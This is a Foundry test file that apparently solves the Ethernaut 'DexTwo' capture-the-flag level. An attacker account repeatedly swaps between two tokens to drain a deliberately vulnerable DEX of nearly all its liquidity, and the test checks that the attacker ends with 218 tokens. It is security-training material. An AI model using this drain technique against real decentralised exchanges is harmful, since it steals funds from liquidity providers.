// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {DexTwo, SwappableTokenTwo} from "../src/DexTwo.sol";

contract DexTwoTest is Test {
    DexTwo public dex;
    address public owner;
    address public attacker;
    SwappableTokenTwo token1;
    SwappableTokenTwo token2;

    function setUp() public {
        owner = vm.addr(0x123);
        attacker = vm.addr(0x246);
        vm.startPrank(owner);
        dex = new DexTwo();
        token1 = new SwappableTokenTwo(address(dex), "1", "1", 1000);
        token2 = new SwappableTokenTwo(address(dex), "2", "2", 1000);
        dex.setTokens(address(token1), address(token2));
        dex.approve(address(dex), type(uint256).max);
        dex.add_liquidity(address(token1), 100);
        dex.add_liquidity(address(token2), 100);
        token1.transfer(attacker, 10);
        token2.transfer(attacker, 10);
        vm.stopPrank();
    }

    function test_dex() public {
        vm.startPrank(attacker);
        dex.approve(address(dex), type(uint256).max);
        token1.transfer(address(dex), 10);
        uint256 c;
        while (token1.balanceOf(address(dex)) > 2 || token2.balanceOf(address(dex)) > 2) {
            if (c % 2 == 0) {
                uint256 me = token2.balanceOf(attacker);
                uint256 de = token2.balanceOf(address(dex));
                if (de == 0) {
                    token2.transfer(address(dex), 1);
                }
                dex.swap(address(token2), address(token1), me > de ? de : me);
            } else {
                uint256 me = token1.balanceOf(attacker);
                uint256 de = token1.balanceOf(address(dex));
                if (de == 0) {
                    token1.transfer(address(dex), 1);
                }
                dex.swap(address(token1), address(token2), me > de ? de : me);
            }
            c++;
        }
        assertEq(token1.balanceOf(address(dex)) + token2.balanceOf(address(dex)), 2);
        assertEq(token1.balanceOf(attacker) + token2.balanceOf(attacker), 218);
    }
}
